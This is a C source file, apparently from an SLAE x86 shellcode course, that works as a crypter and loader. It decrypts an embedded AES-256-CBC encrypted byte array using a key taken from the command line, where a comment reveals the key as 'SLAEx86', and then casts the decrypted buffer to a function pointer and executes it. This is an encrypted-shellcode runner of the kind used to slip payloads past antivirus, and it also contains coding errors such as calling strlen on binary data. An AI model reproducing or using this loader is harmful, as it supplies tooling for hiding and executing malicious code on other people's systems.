#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

int main (int argc,char **argv)
{
	
  /* A 256 bit key */
  //unsigned char *key = (unsigned char *)"01234567890123456789012345678901";

  unsigned char *key = (unsigned char *)argv[1];


  /* A 128 bit IV */
  unsigned char *iv = (unsigned char *)"0123456789012345";  
	//key is SLAEx86
unsigned char ciphertext[]="\xfd\x99\x9c\xef\x9d\x43\x4b\x5a\x50\x5e\xd1\xa5\x98\x34\x47\xca\x43\x55\xf4\x01\xb1\x20\xe0\x4b\x6c\xdf\xa6\xf5\x78\xba\xb3\x11\x7e\x5f\xd0\xbf";
//unsigned char ciphertext[]="\x08\x5f\x3d\x92\xb8\x2c\xd4\x16\x23\xb5\x54\x45\x07\x29\xbc\x18\x9e\xcd\x3a\x3a\x40\x89\xba\x9a\x62\xed\xd1\xed\xb7\x59\x71\x22\x5e\xff\xf9\xbf";
int i;
for(i=0;i<strlen(ciphertext);i++){
        printf("\\x%02x",ciphertext[i]);
}
printf("\n");
  /* Buffer for the decrypted text */
  unsigned char decryptedtext[128];


for(i=0;i<strlen(ciphertext);i++){
        printf("\\x%02x",ciphertext[i]);
}
printf("\n");

  /* Decrypt the ciphertext */
int decryptedtext_len;
  decryptedtext_len = decrypt(ciphertext,32, key, iv,
    decryptedtext);

  /* Add a NULL terminator. We are expecting printable text */
  decryptedtext[decryptedtext_len] = '\0';

  /* Show the decrypted text */
  printf("Decrypted text is:\n");
  printf("%s\n", decryptedtext);

for(i=0;i<strlen(decryptedtext);i++){
	printf("\\x%02x",decryptedtext[i]);
}
printf("\n");
int (*ret)() = (int(*)())decryptedtext;
    ret();

  return 0;
}
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}


int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
  unsigned char *iv, unsigned char *plaintext)
{
  EVP_CIPHER_CTX *ctx;

  int len;

  int plaintext_len;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();

  /* Initialise the decryption operation. IMPORTANT - ensure you use a key
   * and IV size appropriate for your cipher
   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
   * IV size for *most* modes is the same as the block size. For AES this
   * is 128 bits */
  if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    handleErrors();

  /* Provide the message to be decrypted, and obtain the plaintext output.
   * EVP_DecryptUpdate can be called multiple times if necessary
   */
  if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
    handleErrors();
  plaintext_len = len;

  /* Finalise the decryption. Further plaintext bytes may be written at
   * this stage.
   */
  if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) handleErrors();
  plaintext_len += len;

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  return plaintext_len;
}
